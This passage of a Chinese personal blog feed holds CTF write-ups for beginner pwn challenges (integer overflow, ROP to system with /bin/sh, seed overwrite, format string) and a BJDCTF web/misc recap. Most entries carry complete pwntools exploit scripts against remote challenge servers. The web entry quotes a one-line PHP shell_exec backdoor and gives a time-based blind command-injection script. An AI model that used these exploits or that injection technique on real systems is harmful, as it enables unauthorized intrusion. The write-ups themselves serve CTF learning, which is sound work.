	sh.sendline(payload)
	print sh.recv()

def big():
	b_addr = 0x0804A028
	#payload = p32(b_addr) + p32(b_addr + 1) + p32(b_addr + 2) + p32(b_addr + 3)
	#payload = payload + 104 * 'a' + '%6$hhn' + 222 * 'a' + '%7$hhn' + 222 * 'a' + '%8$hhn' + 222 * 'a' + '%9$hhn'
	payload = fmtstr_payload(6,{0x0804A028:0x12345678},write_size='byte')
	sh.sendline(payload)
	print sh.recv()

big()
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[攻防世界pwn新手区—int_overflow]]></title>
        <id>https://zhangzy999.github.io/post/gong-fang-shi-jie-pwn-xin-shou-qu-int_overflow/</id>
        <link href="https://zhangzy999.github.io/post/gong-fang-shi-jie-pwn-xin-shou-qu-int_overflow/">
        </link>
        <updated>2020-06-01T12:43:12.000Z</updated>
        <content type="html"><![CDATA[<p>听名字就是整数溢出<br>
先学习下什么是整数溢出</p>
<h1 id="整数溢出知识">整数溢出知识</h1>
<p>看那种官方的说明看的头大，直接说说我对整数溢出的理解emm<br>
整数溢出，顾名思义就是整数溢出来了，什么是“溢出来”，就是256 = 0，65536 = 0 之类的<br>
我们看个例子  我们在c语言中，用char定义一个变量c，用来存放一个1字节8个二进制位的数据<br>
现在的书本也好，教师也好，总喜欢把char讲成定义字符型变量，其实不是的，char来定义变量的时候，本质就是为一个变量开辟一个字节的内存用来存放数据，这一个字节的空间是由我们任意支配的，想存什么类型的数据都可以，只不过大家都习惯存字符型的而已，跑题了（</p>
<pre><code class="language-c">char c = 1;
</code></pre>
<p>那么在内存中就是 0000 0001<br>
如果是c = -1<br>
那么在内存中就是 1000 0001<br>
1代表符号位<br>
那么思考下，c可存储的范围是多少呢？ 是 -128—127<br>
如果c = 127，即 0111 1111 那么c = c+1，再打印一下c是多少呢？<br>
<img src="https://zhangzy999.github.io//post-images/1591016175946.png" alt="" loading="lazy"><br>
神奇的事情发生了，打印出来是-128，其实也不神奇，因为0111 1111 + 0000 0001 = 1000 0000  = -128<br>
<img src="https://zhangzy999.github.io//post-images/1591016444486.png" alt="" loading="lazy"><br>
如果是无符号类型的话，表示的范围就是0—255<br>
我们看代码</p>
<pre><code class="language-c">unsigned char c = 256;
printf(&quot;%d\n&quot;,c);
</code></pre>
<p>这样又会变成什么呢？思考一下 256 = 255 + 1<br>
也就是 1111 1111 + 1 结果等于 (0001)0000 0000 然而我们内存只给它开辟了一个字节的空间，所以结果会等于零，dev上运行一下看看<br>
<img src="https://zhangzy999.github.io//post-images/1591016989930.png" alt="" loading="lazy"><br>
这就是整数溢出的原理，这是最简单的unsigned char情况，对于word，dword情况也一样</p>
<h1 id="解题">解题</h1>
<h2 id="题目分析">题目分析</h2>
<p>我们运行一下程序看看是什么情况<br>
<img src="https://zhangzy999.github.io//post-images/1591018218857.png" alt="" loading="lazy"><br>
简单的一个模拟登录的功能，接着我们查看一下开启了哪些保护机制<br>
<img src="https://zhangzy999.github.io//post-images/1591018245408.png" alt="" loading="lazy"><br>
栈不可执行保护被打开了，我们直接IDA来看看main函数叭<br>
<img src="https://zhangzy999.github.io//post-images/1591018283129.png" alt="" loading="lazy"><br>
我们跟进去login函数<br>
<img src="https://zhangzy999.github.io//post-images/1591018316958.png" alt="" loading="lazy"><br>
有一个check密码的函数，我们跟进去看看<br>
<img src="https://zhangzy999.github.io//post-images/1591018361068.png" alt="" loading="lazy"><br>
发现strcpy函数，这个函数可能会存在溢出，发现是把s赋给dest，而s的空间又大于dest，所以存在溢出（s即我们在login函数里面传入的参数buf），但是关键是上面有一个判断长度的if判断语句，所以我们得想办法来绕过if判断<br>
看到v3是unsigned char类型的（即IDA中的unsigned __int8），要求v3在4—8之间<br>
根据之前讲解的就可以使用整数溢出来绕过if判断<br>
256 = 0，那么260 = 4，目标明确了，然后找偏移量<br>
<img src="https://zhangzy999.github.io//post-images/1591020302218.png" alt="" loading="lazy"><br>
奈斯，然后发现一个奇奇怪怪的函数<br>
<img src="https://zhangzy999.github.io//post-images/1591020348124.png" alt="" loading="lazy"><br>
奈斯，然后找到cat flag的地址<br>
<img src="https://zhangzy999.github.io//post-images/1591020376308.png" alt="" loading="lazy"><br>
万事具备，只欠exp</p>
<h2 id="exp编写">exp编写</h2>
<pre><code class="language-python">from pwn import *

ip = '124.126.19.106'
port = '37599'
r = remote(ip,port)

system_addr = 0x08048694
offset = 0x14 + 0x4    #加4是覆盖原函数的ebp的值
p32_system_addr = 0x4    #这个是p32发过去system的地址所占的4个字节，在整数溢出的时候要注意一下这个点    
unsigned_int_flow = 260 - offset - p32_system_addr    

payload = 'A' * offset + p32(system_addr) + 'A' * unsigned_int_flow

r.recvuntil('Your choice:')
r.sendline('1')

r.recvuntil('Please input your username:')
r.sendline('Hello')

r.recvuntil('Please input your passwd:')
r.sendline(payload)
r.interactive()
</code></pre>
<p>然后就是flag辣，奈斯<br>
<img src="https://zhangzy999.github.io//post-images/1591020622027.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[攻防世界pwn新手区—guess_num]]></title>
        <id>https://zhangzy999.github.io/post/ad5_guess_num/</id>
        <link href="https://zhangzy999.github.io/post/ad5_guess_num/">
        </link>
        <updated>2020-06-01T02:42:31.000Z</updated>
        <content type="html"><![CDATA[<h1 id="srand函数和rand函数">srand()函数和rand()函数</h1>
<h2 id="引用">引用</h2>
<p>解这个题首先我们要了解下srand()和rand()</p>
<blockquote>
<p>要计算机产生一个随机数不像扔色子一样，计算机的每一步操作，就是执行一堆代码，这些代码是事先安排好的，所以计算机的产生行为是不具有随机性和预测性的（当然这里说的是现阶段的计算机体系，到未来的计算机的体系，未知），所以计算机产生的随机数都不是真正意义上的随机数，只是伪随机数，他以一个真值（也称为种子）作为初始条件，然后用一定的算法不停迭代产生随机数。库函数中系统提供了两个函数用于产生随机数：srand()和rand()<br>
rand函数：rand的内部是用线性同余法做的，不是真的随机数，只不过因为其周期特别长，所以在一定范围内可以看成是随机的，rand()会返回一随机值，范围在0到RAND_MAX间，在调用此函数产生随机数前，必须利用srand()设好随机数种子，若没有设随机数种子，rand()在调用时会自动设随机数种子为1。<br>
返回值：返回0到RAND_MAX之间的整数值，RAND_MAX的范围最少在32767之间（int），即双字节（16位）。若unsigned int双字节是65535，且0-RAND_MAX每个数字被选中的随机率是相同的。  rand()产生的是假随机数，每次执行时是相同的，若要不同以不同的值来初始化，初始化的函数就是srand()<br>
srand函数：and()用来设置rand()产生随机数时的随机数种子，参数seed必须是整数，通常可以用time(0)的返回值作为seed.如果每次seed都设置相同的值，rand()产生的随机数值每次都一样。<br>
srand(unsigned)time(NULL))使用系统定时/计数器的值作为随机种子每个种子对应一组根据算法预先生成的随机数，所以在相同平台的环境下，不同时间产生的随机数是不同的，相应的若将srand(unsigned)tima(NULL)改为任一常量，则无论何时运行，运行多少次得到的随机数都是一组特定的序列，所以srand生成的随机数是伪随机数。但是，所谓的“伪随机数”指的并不是假的随机数，其实绝对的对技术只是一种假想状态的随机数，计算机只能生成相对的随机数，而这些随机数既是随机的又是有规律的，一部分遵守一定规律，一部分则不遵守任何规律，总结来说就是：计算机产生伪随机数而不是绝对的随机数<br>
在每次产生随机序列前，先指定不同的种子，这样计算出来的随机序列就不完全相同了，而使用同种子相同的数调用rand()会导致相同的随机数序列被生成</p>
</blockquote>
<h2 id="总结">总结</h2>
<p>总结一下上面的文本：srand()函数为rand()函数指定随机数种子，如果没有srand()函数，那么rand()函数的默认随机数种子就是1，那么为什么称rand()生成的数是伪随机数呢？这是因为，如果每次随机数种子一样，那么每次生成的随机数都是一样的，比如srand(1) ，那么每次的rand()出来的数字都是一样的，所以为了随机性得到提高，我们一般是用时间函数来作为随机数种子，因为时间时刻在变化，所以种子也在变化，那么随机性就会大大提高。</p>
<h1 id="解题">解题</h1>
<h2 id="题目分析">题目分析</h2>
<p>我们拿到附件后，先运行一下看看程序是什么功能<br>
<img src="https://zhangzy999.github.io//post-images/1590981254204.png" alt="" loading="lazy"><br>
大致就是让我们输入名字，然后让我们猜随机数<br>
我们看看程序开启了哪些保护<br>
<img src="https://zhangzy999.github.io//post-images/1590981270245.png" alt="" loading="lazy"><br>
看到保护之后瞬间不想做了:-(    金丝雀 nx 地址随机化 神马的都开了 （话说我好像在新手区）<br>
不管了，IDA分析一下  先看main函数的代码  发现了几个有意思的点<br>
<img src="https://zhangzy999.github.io//post-images/1590981279421.png" alt="" loading="lazy"><br>
首先是gets输入名字  输入的字符串存到v9变量里面  那么漏洞应该就在这里没错了<br>
接下来设置了一个随机数种子，当然，这个随机数种子的随机性肯定是没问题的<br>
接下来是个for循环，让我们猜10个随机数，如果失败就退出程序，如果成功就运行for循环外面的那个函数<br>
我们跟进去那个函数看看<br>
<img src="https://zhangzy999.github.io//post-images/1590981291748.png" alt="" loading="lazy"><br>
奈斯，直接cat flag，所以我们的任务就是来猜数字，不过是随机数，我们肯定即使是欧皇附体也是猜不到的，所以考虑gets那里溢出来覆盖随机数种子seed[0]，让种子变成一个常数，那么每次的随机数都一样，自然也就可预测了，我们查看一下偏移量<br>
<img src="https://zhangzy999.github.io//post-images/1590981299498.png" alt="" loading="lazy"><br>
然后就直接写exp</p>
<h2 id="编写exp">编写exp</h2>
<p>这个exp比之前的要略微复杂一些，经过查资料发现ctypes这个包很奈斯，里面的cdll.LoadLibrary()函数可以在在脚本中加载动态库，同时又能调用库中的函数，那么我们直接可以通过调用对象的srand()方法来确定种子，那我们就不用再编写c语言程序来确定随机数了，比较方便哈<br>
通过命令ldd来确定库的路径</p>
<pre><code>ldd filename
</code></pre>
<p>这样就得到了库位置（忘记截图了，懒的再回虚拟机截了）<br>
然后直接写exp</p>
<pre><code class="language-python">from pwn import *
import ctypes

ip = '124.126.19.106'
port = '49021'
r = remote(ip,port)

elf = ctypes.cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')
elf.srand(1) #可写可不写，因为默认就是1
offset = 0x20

payload = 'A' * offset + p64(1)
r.recvuntil('Your name:')
r.sendline(payload)
for i in range(0,10):
        number = str(elf.rand()%6 + 1)    #这个地方比较坑，因为r.sendline()的参数是字符类型，所以我们得把数值类型转成字符类型
        r.recvuntil('Please input your guess number:')
        r.sendline(number)
r.interactive()
</code></pre>
<p>然后就是flag辣<br>
<img src="https://zhangzy999.github.io//post-images/1590980821050.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[攻防世界pwn新手区—level2]]></title>
        <id>https://zhangzy999.github.io/post/ad_world_level2/</id>
        <link href="https://zhangzy999.github.io/post/ad_world_level2/">
        </link>
        <updated>2020-05-31T09:19:24.000Z</updated>
        <content type="html"><![CDATA[<p>我们拿到程序，先运行一下，发现没有特别的地方<br>
查看程序的保护机制<br>
<img src="https://zhangzy999.github.io//post-images/1590916932032.png" alt="" loading="lazy"><br>
发现开启了NX保护，就是栈不可执行（ctfwiki上好像有详细说明）<br>
查看main函数<br>
<img src="https://zhangzy999.github.io//post-images/1590916884104.png" alt="" loading="lazy"><br>
发现有一个vul这个函数，跟进去看看<br>
<img src="https://zhangzy999.github.io//post-images/1590916914164.png" alt="" loading="lazy"><br>
首先我们得到偏移为0x88+0x4：这个程序为32位程序，所以main函数中的ebp的值在栈上是32位，也就是4个字节，所以加0x4才能到达函数的返回地址<br>
这个题是提示我们是ROP，那自然想到找一下system函数的地址和&quot;/bin/sh&quot;字符串的地址，先找下system的<br>
<img src="https://zhangzy999.github.io//post-images/1590917154785.png" alt="" loading="lazy"><br>
奈斯，接着shift+f12找binsh<br>
<img src="https://zhangzy999.github.io//post-images/1590917179756.png" alt="" loading="lazy"><br>
然后跟进去，发现binsh字符串的地址<br>
<img src="https://zhangzy999.github.io//post-images/1590917197459.png" alt="" loading="lazy"><br>
然后直接写exp打一下<br>
不过有个点要注意，system函数调用后会有一个返回地址，我们直接用p32函数写个零进去就行（或者写私四个垃圾字符'aaaa'之类的，因为我们只要拿到shell就行了）</p>
<pre><code class="language-python">from pwn import *

ip = '124.126.19.106'
port = '30353'
r = remote(ip,port)

offset = 0x88 + 0x4
system_addr = 0x08048320
binsh_addr = 0x0804a024

payload = 'A' * offset + p32(system_addr) + p32(0) + p32(binsh_addr)

r.sendline(payload)
r.interactive()
</code></pre>
<p>奈斯，然后直接cat flag<br>
<img src="https://zhangzy999.github.io//post-images/1590917362749.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[攻防世界pwn新手区—level0]]></title>
        <id>https://zhangzy999.github.io/post/adworld_level0/</id>
        <link href="https://zhangzy999.github.io/post/adworld_level0/">
        </link>
        <updated>2020-05-28T23:24:59.000Z</updated>
        <content type="html"><![CDATA[<p>下载附件，简单运行一下，发现出现一个hello world然后让我们输入一个字符串，然后就退出程序……<br>
我们拿到ida里面看一看<br>
<img src="https://zhangzy999.github.io//post-images/1590708401179.png" alt="" loading="lazy"><br>
发现有一个vul这种函数，我们跟进去看看<br>
<img src="https://zhangzy999.github.io//post-images/1590708423813.png" alt="" loading="lazy"><br>
发现buf这个变量向堆栈申请了80h这个长度，也就是128个字节，但是我们可以输入200个字节，这个就很危险了，可以确定偏移量为80h+8没错了，我们就是要先填充垃圾字符搞一下80h+8，然后将函数的返回地址改写成system至于为啥是80h+8，放个图，就不解释了（汇编画画堆栈图就知道啦）<br>
<img src="https://zhangzy999.github.io//post-images/1590708690016.png" alt="" loading="lazy"><br>
然后还发现有system函数<br>
<img src="https://zhangzy999.github.io//post-images/1590708707600.png" alt="" loading="lazy"><br>
我们一路跟进去，找找函数地址在哪<br>
<img src="https://zhangzy999.github.io//post-images/1590708724959.png" alt="" loading="lazy"><br>
完美，拿到了函数地址，那么构造exp就很简单了：</p>
<pre><code class="language-python">from pwn import *

r = remote('124.126.19.106','35956')

offset = 0x80 + 8
system_addr = 0x400596

payload = offset * 'A' + p64(system_addr)

r.sendline(payload)
r.interactive()
</code></pre>
<p>直接拿到shell了<br>
<img src="https://zhangzy999.github.io//post-images/1590708766436.png" alt="" loading="lazy"><br>
cat /flag 就完辣</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[攻防世界pwn新手区—hello_pwn]]></title>
        <id>https://zhangzy999.github.io/post/adworld_hello_pwn/</id>
        <link href="https://zhangzy999.github.io/post/adworld_hello_pwn/">
        </link>
        <updated>2020-05-28T11:14:02.000Z</updated>
        <content type="html"><![CDATA[<p>我们拿到附件后，然后简单的运行一下，发现程序让我们输入一个字符串，然后就没了（草率.jpg)<br>
<img src="https://zhangzy999.github.io//post-images/1590664509396.png" alt="" loading="lazy"><br>
然后我们检查一下程序开启了哪些保护</p>
<pre><code>checksec filename
</code></pre>
<p>发现开启了NX保护（使得栈上的数据不可执行）<br>
<img src="https://zhangzy999.github.io//post-images/1590664569065.png" alt="" loading="lazy"><br>
我们用ida64位打开，直接看main的伪代码，发现一个read函数和一个if判断<br>
<img src="https://zhangzy999.github.io//post-images/1590664604117.png" alt="" loading="lazy"><br>
如果满足if条件，就能执行下面的一个函数，我们跟进这个函数，发现它可以cat flag<br>
<img src="https://zhangzy999.github.io//post-images/1590664647984.png" alt="" loading="lazy"><br>
if条件要满足，就能拿到flag，关键是if中的判断咯，我们跟进if的那个变量，发现它距离我们可以控制的那个变量只有四字节，而在read中我们可以输入十个字节，那么就是变量覆盖没跑了<br>
<img src="https://zhangzy999.github.io//post-images/1590664736849.png" alt="" loading="lazy"><br>
我们现在计算器中转下16进制，if中的那个数字到16进制就是0x6E756161是四个字节，美汁汁<br>
写个exp打打就完事了（比攻防世界的第一个题还简单）</p>
<pre><code>from pwn import *

p = remote('124.126.19.106','48949')

offset = 4

payload = offset * 'a' + p64(0x6E756161)

p.recvuntil(&quot;bof&quot;)
p.sendline(payload)
p.interactive()     #先养成良好习惯，加上这句话，免得以后打shellcode的时候忘了加-.-||
</code></pre>
<p>然后拿到flag<br>
<img src="https://zhangzy999.github.io//post-images/1590664968599.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[第三届BJDCTF菜鸡签到记—持续更新wp]]></title>
        <id>https://zhangzy999.github.io/post/di-san-jie-bjdctf-cai-ji-qian-dao-ji-chi-xu-geng-xin-wp/</id>
        <link href="https://zhangzy999.github.io/post/di-san-jie-bjdctf-cai-ji-qian-dao-ji-chi-xu-geng-xin-wp/">
        </link>
        <updated>2020-05-27T11:43:26.000Z</updated>
        <content type="html"><![CDATA[<p>比赛打的细碎，还好赛后出题人说不是针对新手的，要不然我直接自闭:-(<br>
直接wp吧，希望第四届排名能够冲击前100</p>
<h1 id="web">web</h1>
<h2 id="帮帮小红花">帮帮小红花</h2>
<p>赛后复现了一波<br>
这个题目是web里面分数最低的了，但是这个题目很苟<br>
打开题目就是花里胡哨的页面，总之题目告诉我们php后端就一句话</p>
<?php shell_exec($_GET['imagin']); ?>
<p>emm 它只有后门，没有回显的地方，常规思路直接弹个shell玩玩<br>
我Google了一些发现可以利用服务器解析日志dnslog来达到类似的shell效果<br>
有一个提供类似服务的网站，还可以一键生成payload（脚本小子狂喜）<br>
我们直接用dnslog打发现行不通，应该是后端开启了防火墙限制流量之类的（瞎猜的，不过有防火墙是肯定的）或者是服务器没有连接网络<br>
那么应该是bash盲注了，但是我比赛的时候没有注入出来，后来发现脚本中的路径写错了草-.-||<br>
题目中提示我们flag在根目录下，我直接简单的改了改之前sql盲注的脚本，一把梭出来就行了</p>
<pre><code class="language-python">import requests
import time

url = &quot;http://127.0.0.1/flag.php?imagin=&quot;
flag = &quot;BJD{&quot;
flag_list = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789{}&quot;

while True :
    num = 0
    for i in flag_list :
        num = num + 1
        payload = 'grep -e &quot;{}&quot; /flag %26%26 sleep 2'.format(flag + i)
        #%26是&amp;的url编码，这种特殊字符要经过url编码，要不然打不出来-.-|
        start_time = time.time()  #设置发送请求之前的时间
        r = requests.get(url + payload)
        end_time = time.time()  #设置发送请求之后的时间
        if end_time - start_time &gt; 0.5 :
            flag = flag + i
            print(flag)
            break
    if num &gt; 63:
        #此时已经遍历列表，说明flag已经到达结尾
        break
</code></pre>
<p>打一下，就能拿到flag了<br>
<img src="https://zhangzy999.github.io//post-images/1590580947041.PNG" alt="" loading="lazy"></p>
<h2 id="gob">gob</h2>
<p>表面是文件上传，其实是目录穿越<br>
有一个注册功能但是没有卵用，直接注册（或者不注册）到文件上传页面<br>
尝试上传各种php，都被解析成了文本，各种图片马 .htaccess .user.ini都没用<br>
雪殇大佬提示目录穿越在bp中改包<br>
我们打开bp 然后抓包改文件名 改成../../../../flag   然后后面的base64编码的东西解码过了就是flag，感觉比第一题简单，有点儿脑洞的感觉</p>
<h1 id="misc">misc</h1>
<h2 id="questionnaire">questionnaire</h2>
<p>调查问卷，应该是考社工<br>
Google + 百度识图 基本能出来所有的答案<br>
还有一个鸭子的不好出，听师傅们说用百度地图可以找到，还把街道名字给列出来了（tql<br>
其实这题直接f12就出了草<br>
划水签到题<br>
由于第一次玩这种题  感觉还挺有意思的  特地保留了一张图片<br>
<img src="https://zhangzy999.github.io//post-images/1590582813536.png" alt="" loading="lazy"></p>
<h2 id="bincat">/bin/cat</h2>
<p>拿到gif  逐帧提取  然后分离下色道 能看出来是二维码<br>
不会写脚本 直接截图工具手撸  扫描得二维码</p>
]]></content>
    </entry>
</feed>